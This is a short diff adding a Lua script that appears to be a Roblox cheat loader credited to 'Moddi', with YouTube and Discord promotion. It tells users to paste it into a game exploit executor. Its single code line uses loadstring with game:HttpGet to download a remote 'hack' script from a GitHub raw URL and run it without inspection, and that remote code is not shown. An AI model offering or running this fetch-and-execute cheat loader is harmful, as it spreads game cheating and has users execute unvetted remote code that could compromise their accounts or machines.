@@ -1,0 +1,9 @@
+-- Script Made By Moddi
+
+-- YT : Moddi 
+
+-- Join My Discord Servre : https://discord.gg/VYBNqeW
+
+-- Put This In Your Exploit And Execute
+
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/Moddi69/Script/master/ABizarreHackRe"),true))()
